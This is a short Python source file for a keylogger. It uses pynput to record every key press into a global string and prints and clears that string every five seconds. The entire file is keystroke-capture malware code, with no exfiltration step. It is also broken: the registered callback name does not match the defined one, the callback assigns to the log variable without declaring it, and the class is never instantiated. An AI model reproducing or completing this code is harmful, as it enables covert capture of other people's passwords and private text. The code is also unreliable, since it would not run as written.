import pynput.keyboard
import threading
log = ""
class KeyLogger:
    def __init__(self):
        def process_key_process(key):
            try:
                log=log+str(key.char)
            except AttributeError:
                if key == key.space:
                    log = log + " "
                else:
                    log = log + " " + str(key) + " "
        def report():
            global log
            print(log)
            log = ""
            timer = threading.Timer(5, report)
            timer.start()

        keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
        with keyboard_listener:
            report()
            keyboard_listener.join()
            
